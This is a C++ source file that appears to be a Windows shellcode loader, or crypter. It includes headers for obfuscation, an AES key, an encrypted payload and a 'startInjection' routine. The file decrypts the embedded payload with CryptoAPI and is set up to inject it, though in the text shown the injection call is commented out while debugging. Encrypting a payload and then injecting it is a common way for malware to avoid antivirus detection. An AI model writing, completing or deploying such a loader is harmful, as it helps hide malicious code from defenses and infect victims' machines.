#include <windows.h>
#include <wincrypt.h>
#include <iostream>
#include <vector>

#include "../includes/Obfuscate.h"
#include "../includes/startInjection.h"
#include "../bin/encryption_key.h" // AES KEY
#include "../bin/HelloWorldHex.h"  // Encrypted payload

using namespace std;

bool DecryptData(const unsigned char* encryptedData, int encryptedDataSize, unsigned char* key, int keySize, std::vector<unsigned char>& decryptedData) {
    std::cout << "Starting DecryptData function..." << std::endl;  // Debugging output

    HCRYPTPROV hCryptProv;
    HCRYPTKEY hKey;

    // Acquire a cryptographic provider context
    if (!CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        std::cerr << "Error in CryptAcquireContext: " << GetLastError() << std::endl;
        return false;
    }
    std::cout << "Cryptographic context acquired." << std::endl;

    // Import the AES key
    HCRYPTKEY hAesKey;
    if (!CryptImportKey(hCryptProv, key, keySize, 0, 0, &hAesKey)) {
        std::cerr << "Error in CryptImportKey: " << GetLastError() << std::endl;
        CryptReleaseContext(hCryptProv, 0);
        return false;
    }
    std::cout << "AES key imported successfully." << std::endl;

    // Prepare the buffer for decrypted data
    decryptedData.resize(encryptedDataSize);
    memcpy(decryptedData.data(), encryptedData, encryptedDataSize);

    DWORD decryptedDataSize = encryptedDataSize;

    // Decrypt the data in place
    if (!CryptDecrypt(hAesKey, 0, TRUE, 0, decryptedData.data(), &decryptedDataSize)) {
        std::cerr << "Error in CryptDecrypt: " << GetLastError() << std::endl;
        CryptDestroyKey(hAesKey);
        CryptReleaseContext(hCryptProv, 0);
        return false;
    }
    std::cout << "Decryption successful." << std::endl;

    // Release resources
    CryptDestroyKey(hAesKey);
    CryptReleaseContext(hCryptProv, 0);

    // Adjust the size of decryptedData to the actual size of decrypted content
    decryptedData.resize(decryptedDataSize);
    return true;
}

int main() {
    std::cout << "Starting main function..." << std::endl;  // Debugging output

    std::vector<unsigned char> decryptedPayload;

    if (DecryptData(encryptedData, encryptedDataLen, key, keyLen, decryptedPayload)) {
        std::cout << "Decryption successful. Executing payload..." << std::endl;

        // Temporarily comment out startInjection to isolate issues
        // startInjection(decryptedPayload.data(), decryptedPayload.size());
    } else {
        std::cerr << "Decryption failed." << std::endl;
    }

    std::cout << "Program finished without crashing." << std::endl;
    return 0;
}
